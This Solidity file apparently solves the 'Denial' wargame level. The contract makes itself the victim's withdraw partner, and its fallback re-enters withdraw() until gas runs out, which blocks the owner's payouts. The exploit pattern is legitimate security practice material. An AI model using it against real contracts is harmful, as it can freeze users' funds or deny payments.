// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface Denial {
    function setWithdrawPartner(address _partner) external;
    function withdraw() external;
}

contract DenialHackContract {
    address levelContractAddress = 0x793BCdc33D7c5EbFA6A6D0D3C27c6362e673D504;

    constructor() {
        Denial d = Denial(levelContractAddress);
        d.setWithdrawPartner(address(this));
    }

    fallback() external payable {
        Denial d = Denial(levelContractAddress);
        d.withdraw();
    }
}
